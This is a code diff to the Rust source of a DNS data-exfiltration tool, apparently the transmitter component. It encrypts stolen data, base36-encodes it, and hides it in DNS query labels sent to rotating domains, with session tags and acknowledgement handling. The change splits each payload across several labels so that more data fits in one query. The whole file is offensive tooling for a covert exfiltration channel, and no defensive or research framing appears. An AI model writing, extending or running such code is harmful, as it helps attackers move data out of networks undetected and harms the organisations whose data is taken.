@@ -1,7 +1,9 @@
 use crate::base36;
 use crate::config::Config;
 use crate::crypto::{derive_key, encrypt};
-use crate::limits::{chunk_payload_budget_chars, encoded_len_for_payload};
+use crate::limits::{
+    DNS_MAX_NAME, ENVELOPE_LEN, LABEL_CAP, META_LABEL_PREFIX, PAD_LABEL, SESSION_TAG_LEN,
+};
 use crate::metadata::ExfilSession;
 use crate::resolver::ResolverPool;
 use anyhow::{anyhow, Context, Result};
@@ -13,14 +15,9 @@ use trust_dns_proto::op::{Message, MessageType, OpCode, Query};
 use trust_dns_proto::rr::{Name, RData, RecordType};
 use trust_dns_proto::serialize::binary::{BinEncodable, BinEncoder};
 
-const LABEL_CAP: usize = 62;
-const SESSION_TAG_LEN: usize = 3;
 const SESSION_TAG_PREFIX: char = 'E';
 const HEADER_CHUNK_INDEX: u32 = u32::MAX;
-const META_LABEL_PREFIX: &str = "EX";
-const PAD_LABEL: &str = "0";
 const ENVELOPE_VERSION: u8 = 1;
-const ENVELOPE_LEN: usize = SESSION_TAG_LEN + 1 + 1 + 4; // tag + version + flags + counter
 const ENVELOPE_FLAG_INIT: u8 = 0x01;
 const ENVELOPE_FLAG_CHUNK: u8 = 0x02;
 const ENVELOPE_FLAG_COMPLETE: u8 = 0x04;
@@ -75,7 +72,6 @@ impl DnsTransmitter {
             if segment.is_empty() {
                 return Err(anyhow!("metadata segment must not be empty"));
             }
-            ensure_payload_within_budget(segment.len())?;
             let descriptor = FrameDescriptor::metadata(idx as u32, total);
             self.send_frame(session, descriptor, Some(segment.as_slice()))?;
         }
@@ -86,7 +82,6 @@ impl DnsTransmitter {
         let frame_index = index
             .checked_add(1)
             .ok_or_else(|| anyhow!("chunk index overflow"))? as u32;
-        ensure_payload_within_budget(chunk.len())?;
         self.send_frame(session, FrameDescriptor::data(frame_index), Some(chunk))
     }
 
@@ -104,8 +99,8 @@ impl DnsTransmitter {
             return Err(anyhow!("chunk frames must include payload data"));
         }
 
-        let (meta_label, data_label) = self.build_labels(session, &descriptor, payload)?;
-        let qname = self.build_name(&meta_label, &data_label)?;
+        let labels = self.build_labels(session, &descriptor, payload)?;
+        let qname = self.build_name(&labels)?;
 
         let mut last_err = None;
         for attempt in 0..3 {
@@ -157,10 +152,23 @@ impl DnsTransmitter {
         Ok(matches!(ack, Some(ip) if ip == self.ack_next))
     }
 
-    fn build_name(&mut self, meta_label: &str, data_label: &str) -> Result<Name> {
+    fn build_name(&mut self, labels: &[String]) -> Result<Name> {
+        if labels.is_empty() {
+            return Err(anyhow!("frame has no labels"));
+        }
+
         let domain = self.select_domain();
-        let fqdn = format!("{}.{}.{}", meta_label, data_label, domain);
-        Name::from_ascii(fqdn).context("invalid query name")
+        let mut fqdn = labels.join(".");
+        fqdn.push('.');
+        fqdn.push_str(&domain);
+        if fqdn.len() > DNS_MAX_NAME {
+            return Err(anyhow!(
+                "query name length {} exceeds DNS max {}",
+                fqdn.len(),
+                DNS_MAX_NAME
+            ));
+        }
+        Name::from_ascii(&fqdn).context("invalid query name")
     }
 
     fn build_labels(
@@ -168,18 +176,22 @@ impl DnsTransmitter {
         session: &ExfilSession,
         descriptor: &FrameDescriptor,
         payload: Option<&[u8]>,
-    ) -> Result<(String, String)> {
-        let meta = self.build_metadata_label(session, descriptor)?;
-        let data = match payload {
+    ) -> Result<Vec<String>> {
+        let mut labels = Vec::with_capacity(3);
+        labels.push(self.build_metadata_label(session, descriptor)?);
+
+        match payload {
             Some(bytes) => {
                 if bytes.is_empty() {
                     return Err(anyhow!("chunk payload must not be empty"));
                 }
-                self.build_payload_label(bytes)?
+                let mut payload_labels = self.build_payload_labels(bytes)?;
+                labels.append(&mut payload_labels);
             }
-            None => PAD_LABEL.to_string(),
-        };
-        Ok((meta, data))
+            None => labels.push(PAD_LABEL.to_string()),
+        }
+
+        Ok(labels)
     }
 
     fn build_metadata_label(
@@ -237,17 +249,10 @@ impl DnsTransmitter {
         }
     }
 
-    fn build_payload_label(&self, bytes: &[u8]) -> Result<String> {
-        ensure_payload_within_budget(bytes.len())?;
+    fn build_payload_labels(&self, bytes: &[u8]) -> Result<Vec<String>> {
         let ciphertext = encrypt(bytes, &self.aes_key).map_err(|e| anyhow!("{e}"))?;
         let encoded = base36::encode(&ciphertext);
-        if encoded.len() > LABEL_CAP {
-            return Err(anyhow!(
-                "payload label length {} exceeds label budget {LABEL_CAP}",
-                encoded.len()
-            ));
-        }
-        Ok(encoded)
+        Ok(split_encoded_labels(&encoded))
     }
 
     fn select_domain(&mut self) -> String {
@@ -403,6 +408,22 @@ fn encode_base36_fixed(value: u32, width: usize) -> Result<String> {
     Ok(String::from_utf8(buf).expect("ascii"))
 }
 
+fn split_encoded_labels(encoded: &str) -> Vec<String> {
+    if encoded.is_empty() {
+        return vec![PAD_LABEL.to_string()];
+    }
+
+    encoded
+        .as_bytes()
+        .chunks(LABEL_CAP)
+        .map(|chunk| {
+            std::str::from_utf8(chunk)
+                .expect("base36 chunk must be ascii")
+                .to_string()
+        })
+        .collect()
+}
+
 fn max_value_for_width(width: usize) -> u32 {
     36u32.saturating_pow(width as u32).saturating_sub(1)
 }
@@ -418,18 +439,4 @@ fn increment_ip(ip: Ipv4Addr) -> Ipv4Addr {
         }
     }
     Ipv4Addr::from(octets)
-}
-
-fn ensure_payload_within_budget(bytes: usize) -> Result<()> {
-    let encoded = encoded_len_for_payload(bytes);
-    let budget = chunk_payload_budget_chars();
-    if encoded > budget {
-        return Err(anyhow!(
-            "payload of {} bytes expands to {} base36 chars (max {})",
-            bytes,
-            encoded,
-            budget
-        ));
-    }
-    Ok(())
 }
